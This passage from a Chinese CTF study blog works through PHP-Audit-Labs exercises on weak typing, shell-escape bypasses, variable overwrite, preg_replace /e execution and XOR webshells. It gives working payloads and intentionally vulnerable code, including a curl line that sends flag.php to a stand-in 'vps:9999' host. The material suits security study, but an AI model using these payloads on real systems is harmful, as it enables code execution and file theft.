title="练习"></a>练习</h3><p>这是攻防世界上做过的原题。应该是lottery这个把。用到的是json的弱类型。json弱类型判相等时，只要传入true与非零数字。结果都将返回true</p><p>json弱类型比较出名的一个比较就是数字与字符串之间的转换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0&#x3D;&#x3D;&quot;0a....sds&quot;</span><br><span class="line">12&#x3D;&#x3D;&quot;12fw...sd&quot;</span><br><span class="line">789&#x3D;&#x3D;&quot;789asabxz&quot;</span><br></pre></td></tr></table></figure><p>字符串会被直接截取前面的纯数字部分进行判断</p><h2 id="Day5"><a href="#Day5" class="headerlink" title="Day5"></a>Day5</h2><h3 id="escapeshellcmd-escapeshellarg"><a href="#escapeshellcmd-escapeshellarg" class="headerlink" title="escapeshellcmd()+escapeshellarg()"></a>escapeshellcmd()+escapeshellarg()</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/6.PNG" alt></p><p>主体上就是一个过滤了后的mail函数执行。<br>mail函数的参数是这样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bool mail (</span><br><span class="line">string $to ,</span><br><span class="line">string $subject ,</span><br><span class="line">string $message [,</span><br><span class="line">string $additional_headers [,</span><br><span class="line">string $additional_parameters ]]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>由于默认调用的是linux的sendmail函数，所以可以在<code>message</code>中写入恶意代码。接着由additional_parameters 指定额外参数，从而写入在指定目录写入文件。</p><p>但是，php的mail函数也在底层默认执行了一层<code>escapeshellcmd()</code>函数，那么显然转义了我们的恶意代码。<br>不过，本题代码还有一处经典的<code>escapeshellarg()</code>。如果<code>escapeshellarg()</code>+<code>escapeshellcmd()</code>搭配使用，将出现特殊字符逃逸的问题。<br>buu上也有一个类似的题目.这里则借用项目里的例子简单介绍下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1<span class="string">' -v -d a=1</span></span><br><span class="line"><span class="string">#escapeshellarg</span></span><br><span class="line"><span class="string">'</span>127.0.0.1<span class="string">'\'</span><span class="string">' -v -d a=1'</span></span><br><span class="line"><span class="comment">#escapeshellcmd</span></span><br><span class="line"><span class="string">'127.0.0.1'</span>\\<span class="string">''</span> -v -d a=1\<span class="string">'</span></span><br></pre></td></tr></table></figure><p>此时最后一步可以看出，<code>\\</code>将被解释为<code>\</code>不再起到转义的作用，而是作为换行符。因此payload变为先是<code>127.0.0.1</code>，再<code>-v -d</code>-d对应的数据为<code>a=1&#39;</code>.</p><p>比如CVE-2016-10033 跟CVE-2016-10045的两个payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a( -OQueueDirectory&#x3D;&#x2F;tmp -X&#x2F;var&#x2F;www&#x2F;html&#x2F;x.php )@a.com</span><br><span class="line"></span><br><span class="line">a&#39;( -OQueueDirectory&#x3D;&#x2F;tmp -X&#x2F;var&#x2F;www&#x2F;html&#x2F;x.php )@a.com</span><br></pre></td></tr></table></figure><p>前者没有escapeshellcmd直接打。后者escapeshellcmd后又加了一层escapeshellarg导致字符逃逸。</p><h3 id="练习-4"><a href="#练习-4" class="headerlink" title="练习"></a>练习</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($a <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/flag/i'</span>,$key))&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">'are you a hacker'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_POST'</span>, <span class="string">'_GET'</span>, <span class="string">'_COOKIE'</span>) <span class="keyword">as</span> $__R) &#123;</span><br><span class="line">    <span class="keyword">if</span>($$__R) &#123; </span><br><span class="line">        <span class="keyword">foreach</span>($$__R <span class="keyword">as</span> $__k =&gt; $__v) &#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($$__k) &amp;&amp; $$__k == $__v) <span class="keyword">unset</span>($$__k); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_POST) &#123; waf($_POST);&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET) &#123; waf($_GET); &#125;</span><br><span class="line"><span class="keyword">if</span>($_COOKIE) &#123; waf($_COOKIE);&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>($_GET) extract($_GET, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $_GET[<span class="string">'hongri'</span>])&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'error'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(md5($_GET[<span class="string">'flag'</span>] ) == md5($_GET[<span class="string">'hongri'</span>]))&#123;</span><br><span class="line">        $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">        $urlInfo = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="string">"http"</span> === strtolower($urlInfo[<span class="string">"scheme"</span>]) || <span class="string">"https"</span>===strtolower($urlInfo[<span class="string">"scheme"</span>])))&#123;</span><br><span class="line">            <span class="keyword">die</span>( <span class="string">"scheme error!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $url = escapeshellarg($url);</span><br><span class="line">        $url = escapeshellcmd($url);</span><br><span class="line">        system(<span class="string">"curl "</span>.$url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"HRCTF&#123;Are_y0u_maz1ng&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很明显的变量覆盖，之后要绕过waf。再接下来就是escapeshellsmd/arg的搭配进行命令执行了。<br>首先要解决的是，我们必须绕过preg_match的限制才能传入flag变量。因此要利用好它写好的这个功能。</p><p>首先这里利用了可变变量的特性。假设我们提交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?flag&#x3D;test </span><br><span class="line">post:_GET[flag]&#x3D;test</span><br></pre></td></tr></table></figure><p>当开始遍历 <code>$_POST</code> 超全局数组的时候， <code>$__k</code> 代表 _GET[flag] ，所以 <code>$$__k</code>就是 <code>$_GET[flag]</code> ，即 test 值，此时 <code>$$__k == $__v</code> 成立，变量 <code>$_GET[flag]</code> 就被 unset 了</p><p>而接下来下面又有一个变量覆盖<br><code>if($_POST) extract($_POST, EXTR_SKIP);</code><br>所以直接得到<code>$_GET[flag]=test</code>绕过第一层</p><p>第二层只需利用0e的MD5弱类型比较<br>最后是curl的命令执行<br><code>http://baidu.com/&#39; -F file=@/var/www/html/flag.php -x  vps:9999</code><br>似乎当curl版本变高后，将不再能执行。<br><code>curl &#39;127.0.0.1&#39;\&#39;&#39;</code></p><h2 id="Day6"><a href="#Day6" class="headerlink" title="Day6"></a>Day6</h2><h3 id="正则不当导致路径穿越"><a href="#正则不当导致路径穿越" class="headerlink" title="正则不当导致路径穿越"></a>正则不当导致路径穿越</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/7.png" alt></p><p>任意文件删除漏洞。主要是<code>preg_replace()</code>函数的使用不当。忽略了<code>../../</code>这种路径。可以使用路径穿越进行任意文件删除</p><h3 id="练习-5"><a href="#练习-5" class="headerlink" title="练习"></a>练习</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>  (<span class="string">"POST"</span> == $_SERVER[<span class="string">'REQUEST_METHOD'</span>])</span><br><span class="line">&#123;</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt;= preg_match(<span class="string">'/^[[:graph:]]&#123;12,&#125;$/'</span>, $password))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Wrong Format'</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">TRUE</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $reg = <span class="string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">6</span> &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        $c = <span class="number">0</span>;</span><br><span class="line">        $ps = <span class="keyword">array</span>(<span class="string">'punct'</span>, <span class="string">'digit'</span>, <span class="string">'upper'</span>, <span class="string">'lower'</span>);</span><br><span class="line">        <span class="keyword">foreach</span> ($ps <span class="keyword">as</span> $pt)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">"/[[:$pt:]]+/"</span>, $password))</span><br><span class="line">            $c += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($c &lt; <span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"42"</span> == $password) <span class="keyword">echo</span> $flag;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">'Wrong password'</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>练习里的正则写的十分罕见。其实使用到的是php的字符类。除了一看就懂的upper这些，其他的字符类的含义是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph 空格以外的可打印字符</span><br><span class="line">punct  打印字符，不包括字母数字</span><br></pre></td></tr></table></figure><p>主要函数里，第一个正则表示匹配到可打印字符12个以上;第二个正则表示把连续的符号、数字、大写、小写，作为一段，至少分六段;第三个正则表示输入的字符串至少含有符号、数字、大写、小写中的三种类型。</p><p>最后与数字进行弱类型比较。<br>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">42.00e+00000</span><br></pre></td></tr></table></figure><p>红日的文章里还提到了一个配置不当写shell的问题。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'option'</span>])) <span class="keyword">die</span>();</span><br><span class="line">$str = addslashes($_GET[<span class="string">'option'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./config.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">'|\$option=\'.*\';|'</span>, <span class="string">"\$option='$str';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./config.php'</span>, $file);</span><br></pre></td></tr></table></figure><p>这个是不带修饰符模式的正则匹配.<br>第一种方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/index.php?option=a';%0aphpinfo();//</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/index.php?option=a</span></span><br></pre></td></tr></table></figure><p>第一个payload写入内容后只有一个单引号被转义的问题。而第二部分再传入一个a时就会因为<code>.*</code>匹配无数次而把<code>\</code>换掉</p><p>还有两种preg_replace的方法、这里提下第二种，也就是还适用于单行(非贪婪)模式的payload。之前安恒的套娃web2里出现过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test&#x2F;ph.php?option&#x3D;;phpinfo();</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test&#x2F;ph.php?option&#x3D;$0</span><br></pre></td></tr></table></figure><p>其最后的效果是下面这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$option&#x3D;&#39;$option&#x3D;&#39;;phpinfo();&#39;;&#39;;</span><br></pre></td></tr></table></figure><h2 id="Day7"><a href="#Day7" class="headerlink" title="Day7"></a>Day7</h2><h3 id="parse-str-变量覆盖"><a href="#parse-str-变量覆盖" class="headerlink" title="parse_str()变量覆盖"></a>parse_str()变量覆盖</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/8.png" alt></p><blockquote><p>parse_str的作用就是解析字符串并且注册成变量，它在注册变量之前不会验证当前变量是否存在，所以会直接覆盖掉当前作用域中原有的变量。</p></blockquote><p>所以此处存在的变量问题就是<code>parse_str()</code>处理了我们可控的参数后,是可以起到控制全局变量的效果的。因此可以控制<code>$config</code>变量及其对应的参数。达成变量覆盖。</p><p>解决这类变量覆盖问题的最好方法还是通过检查某一变量是否已经设定过了(<code>isset()</code>)。这样在没有设定过变量的else分支才能安全使用<code>parse_str()</code></p><h3 id="练习-6"><a href="#练习-6" class="headerlink" title="练习"></a>练习</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = “hongri”;</span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">@parse_str($id);</span><br><span class="line"><span class="keyword">if</span> ($a[<span class="number">0</span>] != <span class="string">'QNKCDZO'</span> &amp;&amp; md5($a[<span class="number">0</span>]) == md5(<span class="string">'QNKCDZO'</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="uploadsomething.php"&gt;flag is here&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//uploadsomething.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-type:text/html;charset=utf-8"</span>);</span><br><span class="line">$referer = $_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($referer)!== <span class="keyword">false</span>) &#123;</span><br><span class="line">    $savepath = <span class="string">"uploads/"</span> . sha1($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) . <span class="string">"/"</span>;</span><br><span class="line">    <span class="keyword">if</span> (!is_dir($savepath)) &#123;</span><br><span class="line">        $oldmask = umask(<span class="number">0</span>);</span><br><span class="line">        mkdir($savepath, <span class="number">0777</span>);</span><br><span class="line">        umask($oldmask);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((@$_GET[<span class="string">'filename'</span>]) &amp;&amp; (@$_GET[<span class="string">'content'</span>])) &#123;</span><br><span class="line">        <span class="comment">//$fp = fopen("$savepath".$_GET['filename'], 'w');</span></span><br><span class="line">        $content = <span class="string">'HRCTF&#123;y0u_n4ed_f4st&#125;   by:l1nk3r'</span>;</span><br><span class="line">        file_put_contents(<span class="string">"$savepath"</span> . $_GET[<span class="string">'filename'</span>], $content);</span><br><span class="line">        $msg = <span class="string">'Flag is here,come on~ '</span> . $savepath . htmlspecialchars($_GET[<span class="string">'filename'</span>]) . <span class="string">""</span>;</span><br><span class="line">        usleep(<span class="number">100000</span>);</span><br><span class="line">        $content = <span class="string">"Too slow!"</span>;</span><br><span class="line">        file_put_contents(<span class="string">"$savepath"</span> . $_GET[<span class="string">'filename'</span>], $content);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">print</span> <span class="string">&lt;&lt;&lt;EOT</span></span><br><span class="line"><span class="string">&lt;form action="" method="get"&gt;</span></span><br><span class="line"><span class="string">&lt;div class="form-group"&gt;</span></span><br><span class="line"><span class="string">&lt;label for="exampleInputEmail1"&gt;Filename&lt;/label&gt;</span></span><br><span class="line"><span class="string">&lt;input type="text" class="form-control" name="filename" id="exampleInputEmail1" placeholder="Filename"&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;div class="form-group"&gt;</span></span><br><span class="line"><span class="string">&lt;label for="exampleInputPassword1"&gt;Content&lt;/label&gt;</span></span><br><span class="line"><span class="string">&lt;input type="text" class="form-control" name="content" id="exampleInputPassword1" placeholder="Contont"&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;button type="submit" class="btn btn-default"&gt;Submit&lt;/button&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">EOT;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'you can not see this page'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一部分是一个比较刻意的<code>parse_str()</code>变量覆盖的用例。只要解决md5弱类型比较的问题就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;a[0]&#x3D;s878926199a</span><br></pre></td></tr></table></figure><p>第二部分先是注意一个referer头要带上。之后就是一个读flag的问题了。因为flag的内容会在挂起0.1s然后被替换掉。所以需要我们去条件竞争。当然这里上传目录是固定的。所以就可以放心发包了。</p><h2 id="Day8"><a href="#Day8" class="headerlink" title="Day8"></a>Day8</h2><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/9.png" alt></p><p>这是一个自己刚了解CTF不久时接触的一个<code>preg_replace()</code>在<code>/e</code>下存在代码执行的漏洞了。当然这个洞是php5.5版本的</p><p>我们的参数可以控制preg_replace的第一，三个参数。达成任意代码执行。</p><p>然后当时也是读到一篇文章专门讲到这里payload的构造<br>原本官方的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?.*&#x3D;&#123;$&#123;phpinfo()&#125;&#125;</span><br></pre></td></tr></table></figure><p>如果GET请求的参数名存在非法字符，PHP会将其替换成下划线，即<code>.*</code> 会变成 <code>_*</code><br>而实际可行的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\S*&#x3D;$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure><h3 id="练习-7"><a href="#练习-7" class="headerlink" title="练习"></a>练习</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code=$_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE);</span><br><span class="line"><span class="comment">// $hint = "php function getFlag() to get flag";</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code=$_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">50</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Too Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9_]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Not Allowed."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE);</span><br><span class="line"><span class="comment">// $hint = "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>已经司空见惯的无数字字母webshell书写了</p><p>留一个FUZZ脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = str_split(<span class="string">'getFlag'</span>);</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++)&#123;</span><br><span class="line">    $ch = <span class="string">'&#123;'</span>^ chr($i);</span><br><span class="line">    <span class="keyword">if</span> (in_array($ch, $a , <span class="keyword">true</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&#123; ^ chr("</span>.$i.<span class="string">") = $ch&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&#123;&#123;&#123;&#123;&#123;&#123;&#123;"</span>^chr(<span class="number">28</span>).chr(<span class="number">30</span>).chr(<span class="number">15</span>).chr(<span class="number">61</span>).chr(<span class="number">23</span>).chr(<span class="number">26</span>).chr(<span class="number">28</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_&#x3D;&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot;;$_();</span><br></pre></td></tr></table></figure><p>payload2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$哼&#x3D;&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot;;$哼();</span><br></pre></td></tr></table></figure><p>上次做36d的某道题自己用了最极限的无数字字母且不能异或取反的webshell。也就是通配符加上php临时文件命令执行。那个应该算是比较难用的，但可以解决大部分waf了</p><h2 id="Day9"><a href="#Day9" class="headerlink" title="Day9"></a>Day9</h2><h3 id="str-replace-过滤不当"><a href="#str-replace-过滤不当" class="headerlink" title="str_replace()过滤不当"></a>str_replace()过滤不当</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/10.png" 